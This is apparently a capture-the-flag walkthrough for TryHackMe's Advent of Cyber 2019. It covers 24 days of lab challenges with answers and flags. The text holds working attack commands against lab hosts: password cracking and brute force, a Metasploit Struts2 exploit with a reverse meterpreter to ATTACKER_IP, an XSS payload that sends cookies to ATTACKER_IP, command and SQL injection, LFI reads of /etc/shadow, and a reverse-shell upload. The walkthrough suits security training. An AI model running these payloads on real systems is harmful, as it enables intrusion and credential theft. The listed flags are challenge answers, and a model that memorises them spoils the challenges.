
# Advent of Cyber 1 (2019)

## *[Day 1] Inventory Management*

- What is the name of the cookie used for authentication?

> authid

- If you decode the cookie, what is the value of the fixed part of the cookie?

Decode the cookie from base64 and subtract the nickname

> v4er9ll1!ss

- After accessing his account, what did the user mcinventory request?

append the fixed part to the name, base64 encode it, replace your cookie with it and
reload the page

> firewall

---

## *[Day 2] Arctic Forum*

- What is the path of the hidden page?

To bruteforce directories, use ***ffuf***:

```bash
$ ./ffuf -u http://10.10.84.144:3000/FUZZ -ic -t 55 -w ~/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

The results:

```
login                   [Status: 200, Size: 1713, Words: 368, Lines: 52, Duration: 71ms]
home                    [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 81ms]
                        [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 101ms]
admin                   [Status: 302, Size: 27, Words: 4, Lines: 1, Duration: 54ms]
Home                    [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 67ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 58ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 57ms]
Login                   [Status: 200, Size: 1713, Words: 368, Lines: 52, Duration: 59ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 52ms]
logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 72ms]
sysadmin                [Status: 200, Size: 1733, Words: 381, Lines: 54, Duration: 55ms]
Admin                   [Status: 302, Size: 27, Words: 4, Lines: 1, Duration: 53ms]
HOME                    [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 58ms]
Logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 54ms]
                        [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 64ms]
SysAdmin                [Status: 200, Size: 1733, Words: 381, Lines: 54, Duration: 54ms]
LogIn                   [Status: 200, Size: 1713, Words: 368, Lines: 52, Duration: 58ms]
LOGIN                   [Status: 200, Size: 1713, Words: 368, Lines: 52, Duration: 58ms]
```

> /sysadmin

- What is the password you found?

Check the source page. You'll find this comment:

```
 Admin portal created by arctic digital design - check out our github repo
```

Use the following dork to find it:

```
arctic digital design inurl:github
```

The credentials are in the Readme file

> defaultpass

- What do you have to take to the 'partay'

> Eggnog

---

## *[Day 3] Evil Elf*

- Whats the destination IP on packet number 998?

Use the following filter in Wireshark: ***frame.number == 998***

> 63.32.89.195

- What item is on the Christmas list?

Navigate to Statistics -> Protocol Hierarchy. You'll see that there's telnet protocol in
the pcap. Now filter out telnet packets and find the one where user interacts with
cristmas list.

> ps4

- Crack buddy's password!

Someone used telnet to transfer the /etc/passwd file. Filter out telnet packets
and find the one with encrypted passwords. Copy buddy's password and use hashcat
to crack it.

```bash
$ hashcat --force -m 1800 -a 0 buddy-hash.txt ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

> rainbow

---

## *[Day 4] Training*

- How many visible files are there in the home directory(excluding ./ and ../)?

> 8

- What is the content of file5?

> recipes

- Which file contains the string "password"?

```bash
$ grep -iR password .
```

> file6

- What is the IP address in a file in the home folder?

In home directory:

```bash
$ grep -iR -e '\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}'
```

> 10.0.0.05

- How many users can log into the machine?

Read /etc/passwd, 2 users + root

> 3

- What is the sha1 hash of file8?

> fa67ee594358d83becdd2cb6c466b25320fd2835

```bash
$ sha1sum file8
```

- What is mcsysadmin's password hash?

Find the /etc/shadow backup and read it:

```
$ find / -type f -iname '*shadow*' 2>/dev/null
```

> $6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/

---

## *[Day 5] Ho-Ho-Hosint*

Check out the metadata:

```bash
$ exiftool thegrinch.jpg
```

It appers that it was created by JLolax1. Let's google the username and find her
social media.

- What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)

This is in her Twitter profile

> December 29, 1900

- What is Lola's current occupation?

Also in Twitter

> Santa's Helper

- What phone does Lola make?

Also Twitter

> iPhone X

- What date did Lola first start her photography? Format: dd/mm/yyyy

go to the webarchive and input Lola's personal website as target. Select the first
snapshot. It says that Lola started exactly 5 years ago.

> 23/10/2014

- What famous woman does Lola have on her web page?

> ada lovelace

---

## *[Day 6] Data Elf-iltration*

In Wireshark, use `dns` as filter. You'll see data transfered to malicious domain:

"long hex-encoded string".holidaythief.com

That long encoded string: data being exfiltrated.

- What data was exfiltrated via DNS?

> Candy Cane Serial Number 8491

- What did Little Timmy want to be for Christmas?

In Wireshark, go to File -> Export Objects -> HTTP -> cristmaslists.zip

Next, use John the Ripper to crack the password. First, convert it to the format that 
JtR can understand:

```bash
$ ./zip2john ~/CTF/AdventOfCyber1/day5/christmaslists.zip >> ~/CTF/AdventOfCyber1/day5/christmaslists.zip.john
```

Second, crack that file:

```bash
$ ./john ~/CTF/AdventOfCyber1/day5/christmaslists.zip.john -w ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

> PenTester

- What was hidden within the file?

Download the Tryhackme image in the exact same way as the archive. Use stegoveritas to
extract embedded data:

```
$ stegoveritas TryHackMe.jpg
```

A .bin file was found. Read the file with strings:

```bash
$ strings steghide_01bbe3b4b392770510c3969e6d830e3f.bin
```

> RFC527

---

## *[Day 7] Skilling Up*

```bash
$ sudo nmap 10.10.240.119 -Pn -p- -sX -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery
```

- how many TCP ports under 1000 are open?

> 3

- What is the name of the OS of the host?

> Linux

- What version of SSH is running?

> 7.4

- What is the name of the file that is accessible on the server you found running?

> interesting.file

---

## *[Day 8] SUID Shenanigans*

```bash
$ sudo nmap 10.10.5.106 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery
```

- What port is SSH running on?

> 65534

```bash
$ ssh -p 65534 holly@10.10.5.106
```

Let's escalate our privileges. Serach for SUID binaries:

```bash
$ find / -type f -perm -u=s 2>/dev/null
```

Let's exploit SUID on find. You can find the payload on [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)

- Find and run a file as igor. Read the file /home/igor/flag1.txt

> THM{d3f0708bdd9accda7f937d013eaf2cd8}

- Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?

Try the suspiciously-looking /usr/bin/system-control

> THM{8c8211826239d849fa8d6df03749c3a2}

---

## *[Day 9] Requests*

- What is the value of the flag?

>  sCrIPtKiDd

---

## *[Day 10] Metasploit-a-ho-ho-ho*

First, let's find out what we're dealing with:

```bash
$ sudo nmap 10.10.124.98 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln
```

Note, that it runs Apache 7.0.79: to get the version, provoke 404 error. Judging from
nmap scan, the backend runs Struts: a Java MVC framework:

```
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 2
|     /images/
|       gif: 1
|     /js/
|       js: 3
|     /struts/
|       js: 1
|     /styles/
|       css: 4
```

The exploit is: exploit/multi/http/struts2_content_type_ognl

```
msf6 exploit(multi/http/struts2_content_type_ognl) > set rhosts 10.10.49.127
rhosts => 10.10.49.127
msf6 exploit(multi/http/struts2_content_type_ognl) > set rport 80
rport => 80
msf6 exploit(multi/http/struts2_content_type_ognl) > set lhost ATTACKER_IP
lhost => ATTACKER_IP
msf6 exploit(multi/http/struts2_content_type_ognl) > set targeturi /showcase.action
msf6 exploit(multi/http/struts2_content_type_ognl) > set payload payload/linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit
```

At /home/santa You'll find Santa's ssh creds.

Find the flag1:

```bash
$ find / -type f -iname '*flag1*' 2>/dev/null
```

- Compromise the web server using Metasploit. What is flag1?

> THM{3ad96bb13ec963a5ca4cb99302b37e12}

- Now you've compromised the web server, get onto the main system. What is Santa's SSH password?

> rudolphrednosedreindeer

- Who is on line 148 of the naughty list?

Login via ssh to the machine with previously found credentials and use following
command:

```bash
$ nl naughty_list.txt | grep 148
```

> Melisa Vanhoose

- Who is on line 52 of the nice list?

```bash
$ nl nice_list.txt | grep 52
```

> Lindsey Gaffney

---

## *[Day 11] Elf Applications*

Start nmap:

```bash
$ sudo nmap 10.10.38.211 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln
```

First, there's a publically available nfs share "/opt/files". Mount it to your machine 
and access the credentials:

```bash
$ mkdir -p ./nfs-import/opt/files

$ sudo mount -v -t nfs 10.10.38.211://opt/files ./nfs-import/opt/files
```

- What is the password inside the creds.txt file?

> securepassword123

- What is the name of the file running on port 21?

Login as anonymous to ftp

> file.txt

- What is the password after enumerating the database?

The file.txt file contains MySQL credentials. Download it and read it.

Connect to MySQL:

```bash
$ mysql -h 10.10.38.211 -u root -p
```

```
mysql> SHOW DATABASES;

mysql> use data;

mysql> SELECT * FROM USERS;
```

> bestpassword

---

## *[Day 12] Elfcryption*

```bash
$ unzip tosend.zip
```

- What is the md5 hashsum of the encrypted note1 file?

```bash
$ md5sum note1.txt.gpg
```

> 24cf615e2a4f42718f2ff36b35614f8f

- Where was elf Bob told to meet Alice?

```bash
$ gpg -d note1.txt.gpg
```

gpg key is 25daysofchristmas

> Santa's Grotto

- Decrypt note2 and obtain the flag!

```bash
$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2.txt
```

The key is hello

> THM{ed9ccb6802c5d0f905ea747a310bba23}

---

## *[Day 13] Accumulate*

Start nmap:

```bash
$ sudo nmap 10.10.38.26 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln
```

- A web server is running on the target. What is the hidden directory which the website lives on?

```bash
$ ./ffuf -u http://10.10.38.26:80/FUZZ -ic -t 55 -w ~/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

> /retro

- Gain initial access and read the contents of user.txt

Navigate to the /retro and read the "Ready Player One" blog. You'll find wade's
password there:

![password](https://i.postimg.cc/Df1Wb1D0/password.png)

use rdp to connect as wade.

> THM{HACK_PLAYER_ONE}

- Elevate privileges and read the content of root.txt

Privesc is CVE-2019-1388

> THM{COIN_OPERATED_EXPLOITATION}

---

## *[Day 14] Unknown Storage*

We're given a bucket name: ***advent-bucket-one***. The full url to the bucket is:
https://advent-bucket-one.s3.amazonaws.com

- What is the name of the file you found?

Just visit the URL and read the response.

> employee_names.txt

- What is in the file?

read the found file: https://advent-bucket-one.s3.amazonaws.com/employee_names.txt

> mcchef

---

## *[Day 15] LFI*

Nmap scan:

```bash
$ sudo nmap 10.10.158.250 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln
```

The script that fetches notes:

```js
function getNote(note, id) {
const url = '/get-file/' + note.replace(/\//g, '%2f')
$.getJSON(url,  function(data) {
    document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
})
}
// getNote('server.js', '#note-1')
getNote('views/notes/note1.txt', '#note-1')
getNote('views/notes/note2.txt', '#note-2')
getNote('views/notes/note3.txt', '#note-3')
```

To get the note, we just have to send request to the following url:

http://10.10.158.250/get-file/views%2fnotes%2fnote1.txt

- What is Charlie going to book a holiday to?

Read the note #3

> Hawaii

- Read /etc/shadow and crack Charlies password.

Fetch shadow file: http://10.10.158.250/get-file/%2fetc%2fshadow

Save charlie's hash to hash.txt and crack it:

```bash
$ hashcat --force -m 1800 -a 0 hash.txt ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

> password1

- What is flag1.txt?

> THM{4ea2adf842713ad3ce0c1f05ef12256d}

---

## *[Day 16] File Confusion*

The script to exctract everyting recursively (Not an efficient one, just a 3-minute
scetch):

```python
from genericpath import isdir
import os;
import zipfile;

def visitDirectory(path):
	files = os.listdir(path=path);
	for file in files:
		if file.endswith('.zip'):
			try:
				with zipfile.ZipFile(file) as z:
					z.extractall()
					print("Extracted all")
			except:
				print("Invalid file")
			os.remove(file)
		elif os.path.isdir(file):
			visitDirectory(file)

def writeMetadata(path):
	os.system('exiftool ' + path + ' >> exif-result.txt')

def main():
	path = '.'
	canProcede = True
	while canProcede:
		files = os.listdir(path=path);
		zipExists = False
		for file in files:
			if file.endswith('.zip'):
				zipExists = True
				break
		canProcede = zipExists
		if zipExists:
			visitDirectory(path);
    writeMetadata(path)

if __name__ == "__main__":
	main()
```

- How many files did you extract(excluding all the .zip files)

> 50

- How many files contain Version: 1.1 in their metadata?

> 3

- Which file contains the password?

```bash
$ grep -iR passw
```

> dL6w.txt

---

## *[Day 17] Hydra-ha-ha-haa*

- Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

```bash
$ hydra -l molly -P ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.119.255 http-post-form '/login:username=^USER^&password=^PASS^:incorrect' -V
```

> THM{2673a7dd116de68e85c48ec0b1f2612e}

- Use Hydra to bruteforce molly's SSH password. What is flag 2?

```bash
$ hydra -l molly -P ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.119.255 ssh -V
```

> THM{c8eeb0468febbadea859baeb33b2541b}

---

## *[Day 18] ELF JS*

Type this:

```html
</p><script>window.location = 'http://ATTACKER_IP:8000/page?param=' + document.cookie; </script><p>
```

as message, spin up a simple http server and wait for admin cookie.

- What is the admin's authid cookie value?

> 2564799a4e6689972f6d9e1c7b406f87065cbf65

---

## *[Day 19] Commands*

Type http://10.10.77.168:3000/api/cmd/id in the browser and see what happens.

- What are the contents of the user.txt file?

Payload: 

```
http://10.10.77.168:3000/api/cmd/cd%20home%20&&%20cd%20bestadmin%20&&%20cat%20user.txt
```

> 5W7WkjxBWwhe3RNsWJ3Q

---

## *[Day 20] Cronjob Privilege Escalation*

- What port is SSH running on?

```bash
$ sudo nmap 10.10.251.38 -Pn -p- -vv -T4 -A --min-parallelism 55 -oN nmap-scan
```

> 4567

- Crack sam's password and read flag1.txt

```bash
$ hydra -l sam -P ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.251.38 ssh -V -I -s 4567
```

> THM{dec4389bc09669650f3479334532aeab}

- Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

```bash
/home/scripts$ echo 'chmod +r /home/ubuntu/flag2.txt' >> clean_up.sh
```

> THM{b27d33705f97ba2e1f444ec2da5f5f61}

---

## *[Day 21] Reverse Elf-ineering*

![reversed](https://i.postimg.cc/PJ09BcVw/main.png)

- What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?

> 1

- What is the value of eax when the imull instruction is called?

> 6

- What is the value of local_4h before eax is set to 0?

> 6

---

## *[Day 22] If Santa, Then Christmas*

![reverse](https://i.postimg.cc/wBnYL1gz/main.png)

- what is the value of local_8h before the end of the main function?

> 9

- what is the value of local_4h before the end of the main function?

> 2

---

## *[Day 23] LapLANd (SQL Injection)*

```bash
$ sudo nmap 10.10.87.146 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln

$ sqlmap -u http://10.10.87.146/register.php --forms --dbms=mysql --random-agent --level 5 --risk 3 --dump
```

- Which field is SQL injectable? Use the input name used in the HTML code.

> log_email

- What is Santa Claus' email address?

> bigman@shefesh.com

You can obtain Santa Claus's session cookie like this:

```bash
$  curl http://10.10.87.146/register.php -X POST -d 'log_email=bigman%40shefesh.com%27%3B--%20-&log_password=dd&login_button=Login' -v
```

Set the cookie in your browser and navigate to the website's root

- What is Santa Claus' plaintext password?

Save the hash to a file and identify it:

```bash
$ name-that-hash -f hash.txt
```

Crack the hash:

```bash
$ hashcat --force -m 0 -a 0 hash.txt ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

> saltnpepper

- Santa has a secret! Which station is he meeting Mrs Mistletoe in?

![meeting](https://i.postimg.cc/Hs69sKwG/meeting.png)

> Waterloo

- Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/

The way is: upload the php reverse shell in a file with .phtml extension

> THM{SHELLS_IN_MY_EGGNOG}

---

## *[Day 24] Elf Stalk*

Let's fire up namp:

```bash
$ sudo nmap 10.10.10.180 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln
```

Visit the Kibana instance and poke around. You'll find the service version in the
Management section:

![kibana-version](https://i.postimg.cc/7LswXSTJ/kibana-version.png)

Great. Searching for Kibana CVE, we find an [LFI vulnerability](https://github.com/mpgn/CVE-2018-17246).

- Find the password in the database

http://10.10.7.81:9200/_search?q=password

> 9Qs58Ol3AXkMWLxiEyUyyf

- Read the contents of the /root.txt file

```bash
$ wget '10.10.7.81:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt'

# After it hangs, kill it an checkout the log file at port 8000. The flag is near
# ReferenceError
```

> someELKfun

---

